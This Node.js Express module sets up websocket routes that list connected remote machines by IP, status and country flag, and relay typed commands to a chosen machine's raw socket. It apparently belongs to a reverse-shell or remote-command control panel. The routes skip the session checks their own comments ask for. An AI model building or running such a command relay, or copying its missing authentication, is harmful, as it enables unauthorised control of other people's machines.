module.exports = function (app) {
	const funs = require("./funs")
	var router = require('express').Router();
	var session = require('express-session')

	var sockets = [];
	app.set("sockets", sockets);

	var socketsByServer = {};
	app.set("socketsByServer", socketsByServer);

	app.ws('/servers', function (ws, req) {
		//[+]check session here please [+]

		app.get("servers").forEach(async function (server) {
			
			ws.send(JSON.stringify({
				message: "newServer",
				id: server.id,
				ip: server.ip,
				dead: server.dead,
				flag: await funs.ip_flag(server.ip),
				appear:server.appear
			}));
			
			{

			}
		});

		sockets.push(ws);
		app.set("sockets", sockets);
	});

	app.ws('/server/:id', function (ws, req) {
		//[+]check session here please [+]
		
		var messagesByServer = app.get("messagesByServer");
		if (messagesByServer[req.params.id] == undefined) {
			messagesByServer[req.params.id] = [];
		}
		app.set("messagesByServer", messagesByServer)

		messagesByServer[req.params.id].forEach(function (data) {
			ws.send(JSON.stringify({
				message: "data",
				data: data + ""
			}));
		});

		if (socketsByServer[req.params.id] == undefined) {
			socketsByServer[req.params.id] = [];
		}

		socketsByServer[req.params.id].push(ws);
		app.set("socketsByServer", socketsByServer);
		ws.on("message",async function (message) {
			message = JSON.parse(message); //parse json request
			var servers = app.get("servers");
			try {
				message.command = await funs.run_command(message.command)
				servers[parseInt(req.params.id)].socket.write(message.command); // Write command
			} catch (e) {}

			app.set("servers", servers);


			var messagesByServer = app.get("messagesByServer");

			messagesByServer[req.params.id].push(">" + message.command);

			app.set("messagesByServer", messagesByServer)

			var socketsByServer = app.get("socketsByServer");

			socketsByServer[req.params.id].filter(function (wsNew) {
				if (wsNew == ws) {
					return true;
				}
				try {
					wsNew.send(JSON.stringify({
						message: "data",
						data: ">" + message.command
					}));

					return true;
				} catch (e) {
					return false;
				}
			});

			app.set("socketsByServer", socketsByServer);
		});
	});


	return router;

};